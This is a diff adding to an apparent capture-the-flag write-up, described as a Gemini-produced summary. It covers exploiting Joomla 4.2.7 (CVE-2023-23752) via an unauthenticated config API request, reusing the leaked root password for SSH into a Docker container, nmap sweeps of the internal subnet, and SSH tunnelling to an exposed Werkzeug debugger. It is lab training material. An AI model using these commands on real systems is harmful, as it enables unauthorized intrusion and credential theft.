@@ -86,3 +86,51 @@ Disallow: /modules/
 Disallow: /plugins/
 Disallow: /tmp/
 ```
+Sadly - my github got closed while I was editing, so nothing got saved. Ill post summary from gemini:
+New Target: Joomla 4.2.7 (CVE-2023-23752)
+
+After moving laterally, we encountered a machine running Joomla. A scan using joomscan identified the version as 4.2.7, which is susceptible to a critical unauthenticated information disclosure vulnerability in its API.
+
+    Scanning Command: joomscan --url http://10.112.151.128/
+
+    API Exploitation: By appending the ?public=true parameter, we bypassed the "403 Forbidden" restriction on the API endpoint to leak the site's configuration.
+
+    Command: curl "http://10.112.151.128/api/index.php/v1/config/application?public=true"
+
+    Discovery (Credentials):
+
+        Database User: root
+
+        Database Password: RootPassword@1234
+
+        Joomla Superuser: root
+
+4. SSH Access and Initial Foothold
+
+Network reconnaissance revealed two SSH ports: 22 and 2222. The password recovered from the database configuration proved successful for the root user on port 2222.
+
+    Command: ssh root@10.114.185.137 -p 2222
+
+    Result: Gained root access within a Docker container (ID: f5eb774507f2).
+
+5. Internal Docker Pivoting
+
+Operating as root inside the container, we performed an internal network sweep to identify other microservices within the 192.168.100.0/24 subnet.
+
+    Network Sweep: nmap -sn 192.168.100.10/24
+
+    Identified Target: 192.168.100.12 (voyage_priv2.joomla-net).
+
+    Target Port Scan: nmap -p- -sV 192.168.100.12
+
+    Discovery: Port 5000 was open, hosting the "Tourism Secret Finance Panel" powered by Python/Werkzeug.
+
+6. SSH Tunneling and Werkzeug Debugger
+
+To access the internal web application from our local machine, we established an SSH tunnel using Local Port Forwarding.
+
+    Tunnel Command: ssh -L 8888:192.168.100.12:5000 root@10.114.185.137 -p 2222
+
+    Access: http://localhost:8888/
+
+    Key Discovery: The application had the Werkzeug debugger enabled. Navigating to the /console endpoint revealed a locked interactive Python shell, providing a direct path toward Remote Code Execution (RCE).
